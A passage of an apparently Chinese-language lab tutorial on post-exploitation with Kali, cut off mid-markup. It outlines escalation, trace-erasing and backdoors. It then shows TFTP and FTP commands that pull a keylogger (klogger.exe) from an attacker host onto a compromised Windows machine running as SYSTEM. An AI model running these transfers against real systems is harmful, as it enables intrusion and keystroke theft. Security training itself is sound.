{"title":"Kali渗透测试-后渗透","uid":"755b3499f4fdd2a688f548741850cfad","slug":"Kali渗透测试-后渗透","date":"2022-12-22T09:25:03.000Z","updated":"2022-12-22T16:09:35.765Z","comments":true,"path":"api/articles/Kali渗透测试-后渗透.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"后渗透\"><a href=\"#后渗透\" class=\"headerlink\" title=\"后渗透\"></a>后渗透</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>拿下目标服务器的shell后，避免管理员为漏洞打上补丁，之后就再也不能控制目标系统；由此，拿下目标主机shell后需要进行后渗透。</p>\n<ul>\n<li>上传工具</li>\n<li>提权<ul>\n<li>若是拿到普通用户权限需要进行提权</li>\n</ul>\n</li>\n<li>擦除攻击痕迹<ul>\n<li>防止溯源</li>\n</ul>\n</li>\n<li>安装后门<ul>\n<li>长期控制</li>\n<li>Dump 密码</li>\n<li>内网渗透</li>\n</ul>\n</li>\n<li>后渗透阶段<ul>\n<li>最大的挑战—防病毒软件</li>\n<li>使用合法的远程控制软件</li>\n</ul>\n</li>\n</ul></blockquote>\n<h2 id=\"上传工具\"><a href=\"#上传工具\" class=\"headerlink\" title=\"上传工具\"></a>上传工具</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>若控制的系统是Linux系统，目标系统会默认安装netcat、curl、wget；拿下目标主机后使用默认安装的工具下载木马或者远程控制软件。</p>\n<p>若控制的系统是Windows系统，缺少预装的下载工具。</p>\n<p>（相对于windows，linux更加容易实现木马或者远程工具的下载与安装）</p></blockquote>\n<h4 id=\"交互式与非交互式shell\"><a href=\"#交互式与非交互式shell\" class=\"headerlink\" title=\"交互式与非交互式shell\"></a>交互式与非交互式shell</h4><h5 id=\"非交互式shell\"><a href=\"#非交互式shell\" class=\"headerlink\" title=\"非交互式shell\"></a>非交互式shell</h5><p>（需要在windows系统下安装ftp服务）</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222183511339.png\" alt=\"image-20221222183511339\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在已经进入到非交互型的shell中，接着进入下一个子命令后，进一步输入帐号密码时无法执行后面的操作</p></blockquote>\n<h5 id=\"交互式shell\"><a href=\"#交互式shell\" class=\"headerlink\" title=\"交互式shell\"></a>交互式shell</h5><p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222184102500.png\" alt=\"image-20221222184102500\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在交互式shell中，可以正常执行后面的操作</p>\n<p><strong>对于nc侦听到的非交互式shell中，无法正常执行后面的操作</strong>，因此需要上传能够获得完整的交互式shell的后门或者木马进而完全控制目标主机。</p></blockquote>\n<h4 id=\"TFTP传输\"><a href=\"#TFTP传输\" class=\"headerlink\" title=\"TFTP传输\"></a>TFTP传输</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>XP、2003中已默认安装，Win7、2008以后的系统需要单独添加，但经常被边界防火墙过滤。主流为FTP，是因为基于UDP协议，明文传输，不支持身份验证（无需登录验证即可下载服务器文件）。</p>\n<p>思路：</p>\n<p>在kali主机中创建一个目录，把此目录指定为TFTP服务主目录，再拷贝一个后门或者木马程序拷贝到TFTP主目录，在windows端使用TFTP命令将后门或者木马程序下载下来。</p></blockquote>\n<h5 id=\"kali主机配置tftp服务\"><a href=\"#kali主机配置tftp服务\" class=\"headerlink\" title=\"kali主机配置tftp服务\"></a>kali主机配置tftp服务</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、在kali主机创建TFTP主目录：mkdir &#x2F;tftp\n2、修改目录权限：chown -R nobody &#x2F;tftp&#x2F;    # 将所有者改成nobody，主目录中所有文件的属组都必须是nobody，这样才能被下载\n3、cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;tftp   # 查看windows当前用户\n4、cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;tftp  # 拷贝键盘记录器\n5、atftpd --daemon --port 69 &#x2F;tftp   #启动服务，--daemon表示以后台的方式启动，指定端口69，主目录tftp\n6、<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222212118212.png\" alt=\"image-20221222212118212\"></p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222212149538.png\" alt=\"image-20221222212149538\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>确保<code>tftp</code>服务是由<code>atftpd</code>这个进程所启动的</p></blockquote>\n<h5 id=\"windows端下载后门程序\"><a href=\"#windows端下载后门程序\" class=\"headerlink\" title=\"windows端下载后门程序\"></a>windows端下载后门程序</h5><p>进入tftp</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222212552123.png\" alt=\"image-20221222212552123\"></p>\n<p>使用<code>tftp -i 192.168.216.176 get whoami.exe/klogger.exe</code>下载到windows端</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222212846726.png\" alt=\"image-20221222212846726\"></p>\n<p>查看是否传输到windows端</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222213019782.png\" alt=\"image-20221222213019782\"></p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222213149745.png\" alt=\"image-20221222213149745\"></p>\n<p>使用<code>tasklist</code>查看进程是否运行</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222214127940.png\" alt=\"image-20221222214127940\"></p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222214115590.png\" alt=\"image-20221222214115590\"></p>\n<p>其中使用<code>klogger.exe</code>时，必须是在对应权限用户敲击键盘之后才会记录文件；现在获取到的权限是system，而此时klogger.exe文件是在system权限下执行的，所以其他用户敲击键盘是不会记录的</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222220205922.png\" alt=\"image-20221222220205922\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1.txt是在system权限下创建的，其中有一些字符，klogger并没有进行记录；之后在windows端使用administrator用户运行klogger，使klogger在administrator权限下运行，再随机敲击键盘会生成klooger.txt文件，其中记录了administrator用户的键盘记录信息。</p></blockquote>\n<h4 id=\"FTP传输\"><a href=\"#FTP传输\" class=\"headerlink\" title=\"FTP传输\"></a>FTP传输</h4><p>kali安装FTP服务</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">apt-get install pure-ftpd     # 安装pure-ftpd（vsftpd也可以）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>配置脚本（ftp1.sh）</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token shebang important\">#!/bin/bash</span>\n<span class=\"token function\">groupadd</span> ftpgroup\n<span class=\"token function\">useradd</span> <span class=\"token parameter variable\">-g</span> ftpgroup <span class=\"token parameter variable\">-d</span> /dev/null <span class=\"token parameter variable\">-s</span> /etc ftpuser\npure-pw <span class=\"token function\">useradd</span> <span class=\"token builtin class-name\">test</span> <span class=\"token parameter variable\">-u</span> ftpuser <span class=\"token parameter variable\">-d</span> /ftphome\npure-pw mkdb\n<span class=\"token builtin class-name\">cd</span> /etc/pure-ftpd/auth/\n<span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span> <span class=\"token punctuation\">..</span>/conf/PureDB 60pdb\n<span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span> /ftphome\n<span class=\"token function\">chown</span> <span class=\"token parameter variable\">-R</span> ftpuser:ftpgroup /ftphome/       <span class=\"token comment\">#创建的ftp主目录</span>\n/etc/init.d/pure-ftpd restart<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>执行脚本</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.&#x2F;ftp1.sh # 由于脚本中会添加用户，执行过程中需要为创建的用户输入密码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>上传后门</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ls &#x2F;ftphome&#x2F;\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;ftphome&#x2F;\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;ftphome&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>由于目前获得的shell是非交互模式的，ftp传输时，在password命令处无法显示，所以当前直接利用ftp下载是行不通的；</p>\n<p>思路：</p>\n<p>将要执行的命令写到目标服务器的文本文件中，windows上执行ftp命令读取文本文件的命令进行下载。</p></blockquote>\n<p>上传文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">C:\\&gt;echo open 192.168.216.176 21&gt;ftp.txt     \nC:\\&gt;echo test&gt;&gt;ftp.txt\nC:\\&gt;echo password&gt;&gt;ftp.txt　　　　# password是前面设置的密码\nC:\\&gt;echo bin&gt;&gt;ftp.txt            # bin表示使用二进制的传输方式传输\nC:\\&gt;echo GET whoami.exe &gt;&gt; ftp.txt\nC:\\&gt;echo GET klogger.exe &gt;&gt; ftp.txt\nC:\\&gt;echo bye &gt;&gt; ftp.txt\n\nC:\\&gt;type ftp.txt        # type命令查看ftp.txt内容\ntype ftp.txt\nopen 192.168.216.176 21\ntest\npassword\nbin\nGET whoami.exe \nGET klogger.exe \nbye \n\nC:\\&gt;ftp -s:ftp.txt    # ftp -s表示让ftp调用文本文件中的命令去执行\n\nC:\\&gt;whoami \nwhoami\nNT AUTHORITY\\SYSTEM<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 